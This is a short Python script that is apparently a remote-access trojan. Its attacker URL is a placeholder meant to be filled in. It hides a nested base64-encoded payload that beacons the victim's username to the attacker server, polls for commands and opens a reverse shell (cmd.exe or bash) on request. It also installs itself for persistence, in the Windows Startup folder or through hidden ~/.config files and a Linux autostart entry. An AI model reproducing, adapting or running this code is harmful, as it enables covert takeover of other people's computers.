from getpass import getuser
import subprocess
import base64
import sys
import os

URL = "http://your.attacker.machine:8080/" # change this !

code = b'aW1wb3J0IHRocmVhZGluZwppbXBvcnQgZ2V0cGFzcwppbXBvcnQgYmFzZTY0CmltcG9ydCB0aW1lCmltcG9ydCBzdGF0CmltcG9ydCBzeXMKaW1wb3J0IG9zCgpVUkwgPSAie1VSTF9UT19DSEFOR0V9IgoKdHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICAgIG9zLnN5c3RlbShmIntzeXMuZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwgLS11cGdyYWRlIHJlcXVlc3RzIikKCmZyb20gcmVxdWVzdHMgaW1wb3J0IGdldAoKaWYgbm90IFVSTC5lbmRzd2l0aCgnLycpOgogICAgVVJMICs9ICcvJwoKZGVmIHJzKGhvc3QsIHBvcnQpOgogICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgIHNoZWxsID0gImNtZC5leGUiCiAgICBlbHNlOgogICAgICAgIHNoZWxsID0gIi9iaW4vYmFzaCIKICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWMsIGFyZ3M9KGJhc2U2NC5iNjRkZWNvZGUoYidhVzF3YjNKMElITnZZMnRsZEN4dmN5eDBhSEpsWVdScGJtY3NjM1ZpY0hKdlkyVnpjeUJoY3lCemNBcHdQWE53TGxCdmNHVnVLRnNuVTBoRlRFd25YU3dnYzNSa2FXNDljM0F1VUVsUVJTeHpkR1J2ZFhROWMzQXVVRWxRUlN4emRHUmxjbkk5YzNBdVUxUkVUMVZVS1FwelBYTnZZMnRsZEM1emIyTnJaWFFvS1FwekxtTnZibTVsWTNRb0tDSlNTRTlUVkNJc1VsQlBVbFFwS1Fwa1pXWWdjMlZ1WkNod0xITXBPZ29nSUNBZ2QyaHBiR1VnTVRvS0lDQWdJQ0FnSUNCdlBWOWZhVzF3YjNKMFgxOG9KMjl6SnlrdWNtVmhaQ2h3TG5OMFpHOTFkQzVtYVd4bGJtOG9LU3cwTURrMktRb2dJQ0FnSUNBZ0lITXVjMlZ1WkNodktRcGtaV1lnY21WamRpaHdMSE1wT2dvZ0lDQWdkMmhwYkdVZ01Ub0tJQ0FnSUNBZ0lDQnBQWE11Y21WamRpZ3lNRFE0S1FvZ0lDQWdJQ0FnSUY5ZmFXMXdiM0owWDE4b0oyOXpKeWt1ZDNKcGRHVW9jQzV6ZEdScGJpNW1hV3hsYm04b0tTeHBLUXAwYUhKbFlXUnBibWN1VkdoeVpXRmtLSFJoY21kbGREMXpaVzVrTEdGeVozTTlLSEFzY3lrcExuTjBZWEowS0NrS2RHaHlaV0ZrYVc1bkxsUm9jbVZoWkNoMFlYSm5aWFE5Y21WamRpeGhjbWR6UFNod0xITXBLUzV6ZEdGeWRDZ3AnKS5kZWNvZGUoKS5yZXBsYWNlKCJSSE9TVCIsIGhvc3QpLnJlcGxhY2UoIlJQT1JUIiwgcG9ydCkucmVwbGFjZSgiU0hFTEwiLCBzaGVsbCksKSwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKCnJlcXVlc3RzLnBvc3QoVVJMKyJhcGkvc2VuZF9ob3N0bmFtZSIsIGRhdGE9eyJob3N0bmFtZSI6IGdldHBhc3MuZ2V0dXNlcigpfSkKCndoaWxlIDE6CiAgICB0cnk6CiAgICAgICAgcnEgPSByZXF1ZXN0cy5nZXQoVVJMKyJhcGkvZ2V0X2luZm9zIikKICAgICAgICBpZiBycS50ZXh0ICE9ICdudWxsJyBhbmQgcnEudGV4dC5jb3VudCgnOicpID09IDE6CiAgICAgICAgICAgIHJzKCpycS50ZXh0LnNwbGl0KCc6JykpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgdGltZS5zbGVlcCg2MCk='

code = base64.b64encode(base64.b64decode(code).decode().replace("{URL_TO_CHANGE}", URL).encode()).decode()

def main():
    if os.name == 'nt':
        os.system(f"{sys.executable} -m pip install --upgrade pypiwin32")
        os.system(f"{sys.executable} -m pip install --upgrade winshell")
        from winshell import startup

        folder = startup()
        
        ext = os.path.splitext(sys.argv[0])[1]
        
        if ext == '.py':
            file = "run.pyw"
        else:
            file = sys.argv[0]

        with open(os.path.join(folder, file), 'w+') as f:
            f.write(f"exec(__import__('base64').b64decode(b'{code}').decode())")
        return os.path.join(folder, file)
    else:
        for path in (f"/home/{getuser()}/.config/", f"/home/{getuser()}/.config/.python/", f"/home/{getuser()}/.config/.python/modules/", f"/home/{getuser()}/.config/autostart/"):
            if not os.path.isdir(path):
                os.mkdir(path)
        with open(f"/home/{getuser()}/.config/.python/modules/.run.py", 'w+') as f:
            f.write(f"exec(__import__('base64').b64decode(b'{code}').decode())")
        with open(f"/home/{getuser()}/.config/autostart/.setup.desktop", 'w+') as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=Setup
Exec={sys.executable} /home/{getuser()}/.config/.python/modules/.run.py
Terminal=false""")

if os.name == 'nt':
    if '--subprocess' in sys.argv:
        exec(base64.b64decode(code).decode())
    else:
        path = main()
        subprocess.Popen(["start", path, '--subprocess'])
else:
    os.chdir('/')
    pid = os.fork()

    if pid > 0:
        main()
    else:
        exec(base64.b64decode(code.encode()).decode())
